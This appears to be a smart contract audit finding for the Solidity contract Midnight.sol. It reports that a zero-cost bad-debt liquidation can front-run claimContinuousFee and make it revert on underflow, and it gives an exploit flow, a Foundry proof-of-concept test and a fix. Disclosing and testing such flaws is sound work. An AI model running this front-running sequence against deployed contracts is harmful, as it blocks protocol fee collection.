### Title
`claimContinuousFee` reverts via arithmetic underflow when bad-debt liquidation front-runs the feeClaimer - (`src/Midnight.sol`)

### Summary
`claimContinuousFee` performs an unchecked subtraction `_marketState.continuousFeeCredit -= UtilsLib.toUint128(amount)` with no explicit guard that `amount <= continuousFeeCredit`. A bad-debt liquidation atomically reduces `continuousFeeCredit` via the proportional slash formula, so any liquidator can front-run the feeClaimer's pending claim and cause it to revert with a Solidity 0.8 arithmetic underflow.

### Finding Description
**Code path – `claimContinuousFee`** (`src/Midnight.sol:312-325`):

```solidity
_marketState.continuousFeeCredit -= UtilsLib.toUint128(amount);   // line 318
_marketState.totalUnits          -= UtilsLib.toUint128(amount);   // line 319
_marketState.withdrawable        -= UtilsLib.toUint128(amount);   // line 320
```

There is no `require(amount <= _marketState.continuousFeeCredit)` guard. The only protection is Solidity 0.8 checked arithmetic, which reverts on underflow.

**Code path – bad-debt slash in `liquidate`** (`src/Midnight.sol:635-640`):

```solidity
_marketState.continuousFeeCredit = _lossFactor < type(uint128).max
    ? UtilsLib.toUint128(
        _marketState.continuousFeeCredit
            .mulDivDown(type(uint128).max - _marketState.lossFactor,
                        type(uint128).max - _lossFactor)
      )
    : 0;
```

Because `newLossFactor > oldLossFactor`, the ratio `(MAX − newLF) / (MAX − oldLF) < 1`, so `continuousFeeCredit` is strictly reduced on every bad-debt event.

**Exploit flow**:
1. `continuousFeeCredit = X`. feeClaimer broadcasts `claimContinuousFee(market, X, receiver)`.
2. Attacker (any liquidator) front-runs with `liquidate(market, 0, 0, 0, borrower, false, receiver, address(0), "")` — passing `seizedAssets=0, repaidUnits=0` costs **zero tokens** (only gas). This realizes existing bad debt and reduces `continuousFeeCredit` to `X' < X`.
3. feeClaimer's transaction executes: `continuousFeeCredit (= X') -= X` → arithmetic underflow → revert.

**Why existing checks fail**: The Certora spec (`certora/specs/Role.spec:264`) itself encodes the revert condition as `amount > continuousFeeCreditBefore`, confirming no on-chain guard prevents this. The `liquidate` function has no restriction on who can call it with `seizedAssets=0, repaidUnits=0` when bad debt exists.

### Impact Explanation
The feeClaimer's `claimContinuousFee` transaction is griefed and reverts. The feeClaimer must re-read state and resubmit with a reduced amount. The attack is repeatable on every claim attempt as long as any bad-debt-eligible position exists in the market, creating a persistent griefing vector against protocol fee collection.

### Likelihood Explanation
**Preconditions**: (a) a borrower position with bad debt exists (oracle price below `badDebtPriceDown`), and (b) the feeClaimer submits `amount = continuousFeeCredit` (the natural "claim all" call). Both are routine market conditions. **Attacker cost**: gas only — `liquidate` with `seizedAssets=0, repaidUnits=0` transfers no tokens. **Repeatability**: the attack can be replayed on every subsequent claim attempt until no bad-debt positions remain.

### Recommendation
Add an explicit upper-bound check before the subtraction in `claimContinuousFee`:

```solidity
require(amount <= _marketState.continuousFeeCredit, ClaimExceedsContinuousFeeCredit());
```

This makes the revert condition explicit and predictable, and is consistent with the analogous `claimSettlementFee` pattern where `claimableSettlementFee[token] -= amount` is similarly unguarded but the feeClaimer controls that balance exclusively. Alternatively, cap the claim silently: `amount = UtilsLib.min(amount, _marketState.continuousFeeCredit)`.

### Proof of Concept
```solidity
// Foundry fuzz test
function testFuzz_claimContinuousFeeDoSViaBadDebtFrontrun(
    uint256 credit,
    uint256 feeRate,
    uint256 elapsed,
    uint256 badDebtPrice
) public {
    credit   = bound(credit,   1e18, MAX_CREDIT);
    feeRate  = bound(feeRate,  1, MAX_CONTINUOUS_FEE);
    elapsed  = bound(elapsed,  1, TTM - 1);

    // 1. Setup: lender supplies credit, borrower borrows, fees accrue.
    setupLender(credit, feeRate, TTM);
    vm.warp(block.timestamp + elapsed);
    midnight.updatePosition(market, lender);

    uint256 feeCredit = midnight.continuousFeeCredit(id);
    vm.assume(feeCredit > 0);

    // 2. Ensure withdrawable covers the claim (repay first).
    deal(address(loanToken), borrower, credit);
    vm.prank(borrower); midnight.repay(market, credit, borrower, address(0), "");

    // 3. feeClaimer prepares to claim the full continuousFeeCredit.
    uint256 claimAmount = feeCredit; // "claim all"

    // 4. Attacker front-runs: realize bad debt with zero token cost.
    badDebtPrice = bound(badDebtPrice, 1, badDebtPriceDown(credit));
    Oracle(market.collateralParams[0].oracle).setPrice(badDebtPrice);
    midnight.liquidate(market, 0, 0, 0, borrower, false, address(this), address(0), "");

    uint256 feeCreditAfterSlash = midnight.continuousFeeCredit(id);
    vm.assume(feeCreditAfterSlash < claimAmount); // bad debt reduced it

    // 5. feeClaimer's original transaction now reverts.
    vm.prank(feeClaimer);
    vm.expectRevert(); // arithmetic underflow on line 318
    midnight.claimContinuousFee(market, claimAmount, feeClaimer);

    // Assert: continuousFeeCredit is intact (fees not lost, just uncollectable at original amount).
    assertEq(midnight.continuousFeeCredit(id), feeCreditAfterSlash);
}
```

**Expected assertion**: `vm.expectRevert()` passes, confirming the underflow. The final `assertEq` confirms fees are not destroyed — only the claim transaction is DoS'd. [1](#0-0) [2](#0-1) [3](#0-2)

### Citations

**File:** src/Midnight.sol (L312-325)
```text
    function claimContinuousFee(Market memory market, uint256 amount, address receiver) external {
        bytes32 id = toId(market);
        MarketState storage _marketState = marketState[id];
        require(msg.sender == feeClaimer, OnlyFeeClaimer());
        require(_marketState.tickSpacing > 0, MarketNotCreated());

        _marketState.continuousFeeCredit -= UtilsLib.toUint128(amount);
        _marketState.totalUnits -= UtilsLib.toUint128(amount);
        _marketState.withdrawable -= UtilsLib.toUint128(amount);

        emit EventsLib.ClaimContinuousFee(msg.sender, id, amount, receiver);

        SafeTransferLib.safeTransfer(market.loanToken, receiver, amount);
    }
```

**File:** src/Midnight.sol (L626-641)
```text
        if (badDebt > 0) {
            // forge-lint: disable-next-item(unsafe-typecast) as badDebt <= _position.debt
            _position.debt -= uint128(badDebt);
            uint256 _totalUnits = _marketState.totalUnits;
            uint256 _lossFactor = _marketState.lossFactor;
            _marketState.lossFactor = UtilsLib.toUint128(
                type(uint128).max - (type(uint128).max - _lossFactor).mulDivDown(_totalUnits - badDebt, _totalUnits)
            );
            _marketState.totalUnits -= UtilsLib.toUint128(badDebt);
            _marketState.continuousFeeCredit = _lossFactor < type(uint128).max
                ? UtilsLib.toUint128(
                    _marketState.continuousFeeCredit
                        .mulDivDown(type(uint128).max - _marketState.lossFactor, type(uint128).max - _lossFactor)
                )
                : 0;
        }
```

**File:** certora/specs/Role.spec (L251-271)
```text
rule feeClaimerCanClaimContinuousFee(env e, Midnight.Market market, uint256 amount, address receiver, address user) {
    bytes32 id = toId(e, market);
    address feeClaimerBefore = feeClaimer();
    bool marketIsCreated = marketIsCreated(id);
    uint256 withdrawableBefore = withdrawable(id);
    uint256 totalUnitsBefore = totalUnits(id);
    uint128 continuousFeeCreditBefore = currentContract.marketState[id].continuousFeeCredit;
    mathint midnightBalanceBefore = tokenBalance[market.loanToken][currentContract];
    mathint receiverBalanceBefore = tokenBalance[market.loanToken][receiver];
    mathint userBalanceBefore = tokenBalance[market.loanToken][user];

    claimContinuousFee@withrevert(e, market, amount, receiver);
    bool reverted = lastReverted;
    assert !reverted <=> e.msg.sender == feeClaimerBefore && e.msg.value == 0 && marketIsCreated && amount <= withdrawableBefore && amount <= totalUnitsBefore && amount <= continuousFeeCreditBefore;
    assert !reverted => withdrawable(id) == withdrawableBefore - amount;
    assert !reverted => totalUnits(id) == totalUnitsBefore - amount;
    assert !reverted => currentContract.marketState[id].continuousFeeCredit == continuousFeeCreditBefore - amount;
    assert !reverted => tokenBalance[market.loanToken][currentContract] == midnightBalanceBefore - (receiver == currentContract ? 0 : amount);
    assert !reverted => tokenBalance[market.loanToken][receiver] == receiverBalanceBefore + (receiver == currentContract ? 0 : amount);
    assert !reverted => user != currentContract && user != receiver => tokenBalance[market.loanToken][user] == userBalanceBefore;
}
```
